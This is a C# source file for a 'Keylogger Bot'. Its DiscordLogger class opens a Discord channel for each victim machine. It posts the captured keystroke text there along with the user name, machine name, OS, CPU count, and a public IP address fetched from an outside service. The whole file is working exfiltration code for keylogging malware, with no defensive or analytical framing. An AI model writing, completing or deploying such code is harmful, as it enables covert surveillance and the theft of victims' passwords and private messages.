using System.Text;
using System.Text.RegularExpressions;
using DSharpPlus;
using DSharpPlus.Entities;

public class DiscordLogger : IAsyncDisposable
{
    private readonly DiscordClient _client;
    private readonly ulong _logGuildId;
    private readonly ulong _machineCategoryId;
    private readonly HttpClient _http;

    public DiscordLogger(string botToken, ulong logGuildId, ulong machineCategoryId, HttpClient? httpClient = null)
    {
        _logGuildId = logGuildId;
        _machineCategoryId = machineCategoryId;
        _http = httpClient ?? new HttpClient();

        _client = new DiscordClient(new DiscordConfiguration
        {
            Token = botToken,
            TokenType = TokenType.Bot,
            Intents = DiscordIntents.AllUnprivileged | DiscordIntents.MessageContents
        });
    }

    public async Task InitializeAsync()
    {
        await _client.ConnectAsync();
        var tcs = new TaskCompletionSource<bool>();
        _client.Ready += (s, e) =>
        {
            tcs.TrySetResult(true);
            return Task.CompletedTask;
        };
        await Task.WhenAny(tcs.Task, Task.Delay(5000));
    }

    private static string NormalizeChannelName(string s)
    {
        var lower = s.ToLowerInvariant();
        var sb = new StringBuilder();
        foreach (char c in lower)
        {
            if ((c >= 'a' && c <= 'z') || (c >= '0' && c <= '9'))
                sb.Append(c);
            else
                sb.Append('-');
        }
        var collapsed = Regex.Replace(sb.ToString(), "-+", "-").Trim('-');
        return collapsed.Length > 100 ? collapsed.Substring(0, 100) : collapsed;
    }

    public async Task<DiscordChannel> GetOrCreateMachineChannelAsync(string machineName)
    {
        var guild = await _client.GetGuildAsync(_logGuildId);
        string channelName = NormalizeChannelName(machineName);

        var existing = guild.Channels.Values.FirstOrDefault(c => c.Name == channelName);
        if (existing != null) return existing;

        var category = guild.GetChannel(_machineCategoryId);
        var newChannel = await guild.CreateTextChannelAsync(channelName,
            parent: category,
            topic: $"Logs da máquina {machineName}");
        return newChannel;
    }

    public async Task SendLogAsync(string machineName, string userName, string osVersion, string cpuCount, string capturedText)
    {
        var channel = await GetOrCreateMachineChannelAsync(machineName);

        string publicIp;
        try
        {
            publicIp = (await _http.GetStringAsync("https://api.ipify.org")).Trim();
        }
        catch
        {
            publicIp = "Não disponível";
        }

        var embed = new DiscordEmbedBuilder()
            .WithTitle("📝 Novo Texto Capturado")
            .WithColor(DiscordColor.Blurple)
            .WithTimestamp(DateTimeOffset.UtcNow)
            .WithFooter("Keylogger Bot")
            .AddField("👤 Usuário", userName, true)
            .AddField("🖥️ Máquina", machineName, true)
            .AddField("🛠️ OS", osVersion, true)
            .AddField("⚙ CPUs", cpuCount, true)
            .AddField("🌐 IP Público", publicIp, true)
            .AddField("📋 Texto Capturado", $"```{capturedText}```")
            .Build();

        try
        {
            await channel.SendMessageAsync(embed);
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"Erro ao enviar log para Discord: {ex.Message}");
        }
    }

    public async ValueTask DisposeAsync()
    {
        if (_client != null)
        {
            await _client.DisconnectAsync();
            _client.Dispose();
        }
        _http.Dispose();
    }
}